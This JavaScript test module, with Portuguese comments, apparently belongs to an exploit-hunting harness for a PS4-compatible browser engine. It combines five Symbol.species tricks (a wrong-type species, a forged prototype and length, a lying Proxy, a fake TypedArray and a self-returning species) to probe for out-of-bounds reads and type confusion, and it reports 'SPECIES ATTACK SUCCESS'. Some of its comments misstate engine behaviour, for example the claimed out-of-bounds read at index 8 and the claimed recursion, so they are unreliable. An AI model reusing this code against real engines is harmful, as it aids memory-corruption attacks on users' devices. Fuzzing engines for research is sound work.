/**
 * TEST: Species Constructor Confusion - AVANÇADO
 * Explora Symbol.species com MÚLTIPLOS vetores de ataque simultâneos
 * 
 * TÉCNICAS COMBINADAS:
 * 1. Species que retorna tipo diferente
 * 2. Species que modifica o prototype chain
 * 3. Species que cria objetos com getters armadilhas
 * 4. Species que retorna Proxy
 * 5. Species que corrompe o `this` do construtor
 */

export const testSpeciesConstructorConfusionAdvanced = {
    id: 'SPECIES_CONFUSION_ADV',
    name: '🧬 Species Confusion Advanced',
    risk: 'CRITICAL',
    category: 'PROTO',
    description: 'Symbol.species com múltiplos vetores combinados para type confusion',
    ps4Compatible: true,

    setup: function() {
        this.results = [];
        this.oobDetected = false;
        this.typeConfusionDetected = false;
        this.prototypeCorrupted = false;
        
        // Spy para detectar corrupção
        this.spyArray = new Uint32Array(16);
        this.spyArray.fill(0xBBBBBBBB);
        
        // Arrays originais para comparação
        this.originalArray = new Uint32Array(16);
        for (let i = 0; i < 16; i++) {
            this.originalArray[i] = 0xDEAD0000 + i;
        }
    },

    probe: [
        function(scenario) { return scenario.oobDetected ? 1 : 0; },
        function(scenario) { return scenario.typeConfusionDetected ? 1 : 0; },
        function(scenario) { return scenario.prototypeCorrupted ? 1 : 0; },
        function(scenario) { return scenario.spyArray[0] === 0xBBBBBBBB ? 0 : 1; }, // Spy corrompido?
        function(scenario) { return scenario.results.length; }
    ],

    trigger: function() {
        this.results = [];
        this.oobDetected = false;
        this.typeConfusionDetected = false;
        this.prototypeCorrupted = false;

        // ==========================================
        // VETOR 1: Species que retorna tipo ERRADO
        // ==========================================
        try {
            class ConfusedArray extends Uint32Array {
                static get [Symbol.species]() {
                    // Retorna Float64Array em vez de Uint32Array!
                    return Float64Array;
                }
            }

            const confused = new ConfusedArray(16);
            for (let i = 0; i < 16; i++) {
                confused[i] = 0xAAAAAAAA;
            }

            // .map() vai criar Float64Array (tipo diferente!)
            const mapped = confused.map(x => x * 2);
            
            this.results.push({
                vector: 'WRONG_TYPE_SPECIES',
                originalType: confused.constructor.name,
                mappedType: mapped?.constructor?.name,
                mappedLength: mapped?.length,
                mappedByteLength: mapped?.buffer?.byteLength
            });

            // Uint32Array(16) = 64 bytes → Float64Array precisa de 128 bytes
            // Se o engine criou Float64Array com 64 bytes → acesso OOB!
            if (mapped && mapped.constructor === Float64Array) {
                try {
                    // Tenta acessar índice 8 (precisa de 64 bytes, Float64Array de 16 elementos = 128 bytes)
                    // Se o buffer tem 64 bytes, índice 8 está OOB!
                    const oobVal = mapped[8];
                    if (oobVal !== undefined) {
                        this.results.push({
                            vector: 'WRONG_TYPE_OOB',
                            index: 8,
                            value: oobVal,
                            hex: '0x' + oobVal.toString(16)
                        });
                        // Verifica se vazou dados do spy
                        if (Math.abs(oobVal) === 0xBBBBBBBB || (oobVal & 0xFFFFFFFF) === 0xBBBBBBBB) {
                            this.oobDetected = true;
                        }
                    }
                } catch (e) {
                    this.results.push({ vector: 'WRONG_TYPE_OOB', error: e.message });
                }
            }

        } catch (e) {
            this.results.push({ vector: 'WRONG_TYPE_SPECIES', error: e.message });
        }

        // ==========================================
        // VETOR 2: Species que modifica PROTOTYPE CHAIN
        // ==========================================
        try {
            const fakeProto = {
                length: { value: 1000000, writable: true },
                constructor: Uint32Array
            };

            class ProtoConfusedArray extends Uint32Array {
                static get [Symbol.species]() {
                    return function(length) {
                        const arr = new Uint32Array(4); // Buffer minúsculo
                        // Substitui o prototype
                        Object.setPrototypeOf(arr, fakeProto);
                        // Força length enorme
                        Object.defineProperty(arr, 'length', { value: 1000000 });
                        return arr;
                    };
                }
            }

            const protoConfused = new ProtoConfusedArray(16);
            protoConfused.fill(0xCCCCCCCC);

            const sliced = protoConfused.slice(0, 10);
            
            this.results.push({
                vector: 'PROTO_CHAIN_SPECIES',
                slicedLength: sliced?.length,
                slicedByteLength: sliced?.buffer?.byteLength,
                prototypeChainLength: (() => {
                    let count = 0;
                    let obj = sliced;
                    while (obj && count < 100) { obj = Object.getPrototypeOf(obj); count++; }
                    return count;
                })()
            });

            if (sliced && sliced.length > 100) {
                // Tenta OOB via length corrompido
                try {
                    const oobVal = sliced[20];
                    if (oobVal !== undefined && oobVal !== 0xCCCCCCCC) {
                        this.oobDetected = true;
                        this.results.push({
                            vector: 'PROTO_CHAIN_OOB',
                            index: 20,
                            value: '0x' + oobVal.toString(16)
                        });
                    }
                } catch (e) {}
            }

        } catch (e) {
            this.results.push({ vector: 'PROTO_CHAIN_SPECIES', error: e.message });
        }

        // ==========================================
        // VETOR 3: Species com GETTER ARMADILHA
        // ==========================================
        try {
            let getterCallCount = 0;
            const trapArray = new Uint32Array(16);
            trapArray.fill(0xDDDDDDDD);

            const handler = {
                get(target, prop, receiver) {
                    getterCallCount++;
                    
                    // Após N acessos, começa a mentir sobre índices
                    if (getterCallCount > 5 && typeof prop === 'string' && !isNaN(prop)) {
                        const idx = parseInt(prop);
                        if (idx >= target.length) {
                            // Retorna dados do spy array!
                            return 0xBBBBBBBB;
                        }
                    }
                    
                    // Mente sobre o length
                    if (prop === 'length' && getterCallCount > 10) {
                        return 1000000;
                    }
                    
                    return Reflect.get(target, prop, receiver);
                }
            };

            const proxyTrap = new Proxy(trapArray, handler);

            class ProxySpeciesArray extends Uint32Array {
                static get [Symbol.species]() {
                    return function() {
                        return proxyTrap;
                    };
                }
            }

            const proxySource = new ProxySpeciesArray(16);
            proxySource.fill(0xEEEEEEEE);

            // .filter() deve retornar o proxy
            const filtered = proxySource.filter(x => x > 0);
            
            this.results.push({
                vector: 'PROXY_SPECIES',
                filteredType: typeof filtered,
                filteredLength: filtered?.length,
                getterCallCount: getterCallCount
            });

            // Verifica se o proxy mentiu sobre valores OOB
            if (filtered && filtered.length > 1000) {
                const oobVal = filtered[20];
                if (oobVal === 0xBBBBBBBB) {
                    this.oobDetected = true;
                    this.typeConfusionDetected = true;
                    this.results.push({
                        vector: 'PROXY_SPECIES_LEAK',
                        message: 'Proxy species vazou dados do spy array via getter armadilha!'
                    });
                }
            }

        } catch (e) {
            this.results.push({ vector: 'PROXY_SPECIES', error: e.message });
        }

        // ==========================================
        // VETOR 4: Species que CORROMPE o `this`
        // ==========================================
        try {
            class CorruptedThisArray extends Uint32Array {
                constructor(...args) {
                    super(...args);
                    // Durante a construção, `this` pode não estar totalmente inicializado
                    this._corrupted = true;
                }

                static get [Symbol.species]() {
                    const Self = this;
                    return function corruptedSpecies(...args) {
                        // Cria array NORMAL (não TypedArray) e tenta passar como TypedArray
                        const fake = [];
                        fake.length = 1000000;
                        // Adiciona propriedades para parecer TypedArray
                        fake.buffer = new ArrayBuffer(0);
                        fake.byteLength = 1000000;
                        fake.byteOffset = 0;
                        fake.BYTES_PER_ELEMENT = 4;
                        // Adiciona métodos quebrados
                        fake.fill = function(val) {
                            // Não faz nada - ou escreve em lugares errados
                            for (let i = 0; i < 1000; i++) {
                                this[i] = val;
                            }
                            return this;
                        };
                        fake.map = Array.prototype.map;
                        fake.slice = Array.prototype.slice;
                        fake.filter = Array.prototype.filter;
                        return fake;
                    };
                }
            }

            const corruptedSource = new CorruptedThisArray(16);
            corruptedSource.fill(0xFFFFFFFF);

            const corruptedResult = corruptedSource.map(x => x ^ 0xFFFF0000);
            
            this.results.push({
                vector: 'CORRUPTED_THIS',
                resultType: typeof corruptedResult,
                resultConstructor: corruptedResult?.constructor?.name,
                resultLength: corruptedResult?.length,
                isTypedArray: corruptedResult instanceof Uint32Array,
                isArray: Array.isArray(corruptedResult)
            });

            // Se retornou array normal mas com length 1000000...
            if (Array.isArray(corruptedResult) && corruptedResult.length > 1000) {
                this.typeConfusionDetected = true;
                this.results.push({
                    vector: 'CORRUPTED_THIS_CONFUSION',
                    message: 'Species retornou Array em vez de TypedArray com length corrompido!'
                });
            }

        } catch (e) {
            this.results.push({ vector: 'CORRUPTED_THIS', error: e.message });
        }

        // ==========================================
        // VETOR 5: Species RECURSIVA (loop infinito)
        // ==========================================
        try {
            class RecursiveSpeciesArray extends Uint32Array {
                static get [Symbol.species]() {
                    return this; // Retorna a SI MESMA (recursão!)
                }
            }

            const recursive = new RecursiveSpeciesArray(16);
            recursive.fill(0x11111111);

            // .map() vai chamar species → que retorna RecursiveSpeciesArray → que chama species...
            try {
                const recursiveResult = recursive.map(x => x + 1);
                
                this.results.push({
                    vector: 'RECURSIVE_SPECIES',
                    success: true,
                    resultLength: recursiveResult?.length,
                    resultConstructor: recursiveResult?.constructor?.name
                });

            } catch (e) {
                this.results.push({
                    vector: 'RECURSIVE_SPECIES',
                    error: e.message
                });
                
                // Se o engine detectou recursão, é um bom sinal
                if (e.message.includes('recursion') || e.message.includes('stack')) {
                    this.prototypeCorrupted = true;
                }
            }

        } catch (e) {
            this.results.push({ vector: 'RECURSIVE_SPECIES', error: e.message });
        }

        if (typeof gc === 'function') gc();
    },

    cleanup: function() {
        this.spyArray = null;
        this.originalArray = null;
        this.results = null;
    },

    customValidator: function(baseResults, afterResults) {
        const findings = [];

        // 1. OOB detectado
        if (this.oobDetected) {
            findings.push('OOB_READ');
        }

        // 2. Type confusion
        if (this.typeConfusionDetected) {
            findings.push('TYPE_CONFUSION');
        }

        // 3. Prototype corrompido
        if (this.prototypeCorrupted) {
            findings.push('PROTOTYPE_CORRUPTION');
        }

        // 4. Spy corrompido
        if (afterResults[3] === 1) {
            findings.push('SPY_CORRUPTION');
            this.oobDetected = true;
        }

        // 5. Análise automática de resultados interessantes
        const interestingResults = this.results?.filter(r => 
            r.vector?.includes('OOB') || 
            r.vector?.includes('LEAK') || 
            r.vector?.includes('CONFUSION') ||
            (r.resultLength && r.resultLength > 1000) ||
            (r.mappedType && r.originalType && r.mappedType !== r.originalType)
        ) || [];

        if (interestingResults.length > 0) {
            findings.push(`INTERESTING(${interestingResults.length})`);
        }

        if (findings.length > 0) {
            return {
                anomaly: true,
                reason: `💥💥💥 SPECIES ATTACK SUCCESS: ${findings.join(' | ')}\n\n` +
                       `Resultados detalhados:\n${JSON.stringify(this.results?.filter(r => !r.error), null, 2)}\n\n` +
                       `Resultados com erro:\n${JSON.stringify(this.results?.filter(r => r.error), null, 2)}`
            };
        }

        return { anomaly: false, reason: '' };
    }
};
